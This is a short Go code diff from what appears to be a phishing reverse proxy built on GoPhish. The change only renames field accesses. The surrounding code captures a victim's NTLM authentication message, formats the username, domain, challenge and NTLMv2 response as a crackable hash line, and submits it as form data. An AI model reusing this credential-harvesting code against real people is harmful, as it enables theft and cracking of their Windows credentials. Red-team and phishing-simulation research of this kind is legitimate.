@@ -162,10 +162,10 @@ func (rp *GoPhishReverseProxy) HandleFunc(w http.ResponseWriter, r *http.Request
 			msg3.Read(authorization_bytes)
 
 			ntlmv2Response := ntlmAuth.NTLMv2Response{}
-			ntlmv2Response.Read(msg3.NTLMv2Response.RawData)
+			ntlmv2Response.Read(msg3.NTLMv2Response.Payload)
 			logger.Printf("%s", ntlmv2Response.ToString())
 
-			ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(ntlmAuth.Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])
+			ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.Payload), string(msg3.TargetName.Payload), []byte(ntlmAuth.Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.Payload[len(ntlmv2Response.NTProofStr):])
 
 			formData = url.Values{
 				"ntlm_v2": {ntlmv2_pwdump},
